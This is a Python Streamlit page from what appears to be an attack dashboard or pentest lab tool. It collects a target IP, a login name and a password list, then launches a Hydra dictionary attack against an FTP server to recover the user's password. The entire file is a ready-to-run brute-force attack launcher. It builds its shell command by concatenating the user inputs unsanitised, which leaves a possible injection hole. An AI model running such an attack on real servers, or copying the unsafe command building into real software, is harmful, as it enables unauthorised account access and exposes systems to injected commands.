import streamlit as st
from threadManagement.ThreadManager import ThreadManager
from utils.InternetProtocolValidator import InternetProtocolValidator
import os

def check_parameters_errors(dictionary: str, login: str, target: str) -> bool:
    if dictionary == "" or not os.path.isfile(dictionary):
        st.error(body="Dictionary file path must be valid.")
        return True
    elif login == "":
        st.error(body="Login user cannot be empty.")
        return True
    elif not InternetProtocolValidator.is_valid_ip(ip_string=target):
        st.error(body="Target IP address must be valid.")
        return True
    return False

attack = "Bruteforce FTP"
dictionary = ""
login = ""
target = ""
threadManager = ThreadManager()
st.title(body=attack)

st.caption(
    body="This attack consists in performing a dictionary attack using Hydra on a FTP server"
         " in order to get the password of a user.")

# check if attack is already in action
attackInAction = threadManager.check_running(attack=attack)
# if yes, allow attack to be stopped
if attackInAction == True:
    if not threadManager.check_for_error(attack=attack):
        if st.button("Stop attack"):
            threadManager.stop_attack(attack=attack)
            st.rerun()
else:
    # if no, allow execution
    dictionary = st.text_input(label="Dictionary", help="Absolute path to the dictionary file with the passwords")
    login = st.text_input(label="Login as", help="This will be the user the attack will use to guess the password")
    target = st.text_input(label="Target IP address", help="IP address of the FTP server")
    if st.button("Start attack"):
        if not check_parameters_errors(dictionary=dictionary, login=login, target=target):
            command = "hydra -l " + login + " -P " + dictionary + " " + target + " -t 4 -I -V ftp -f"
            threadManager.start_attack(attack=attack, command=command)
            st.rerun()


# returns True if there is an error

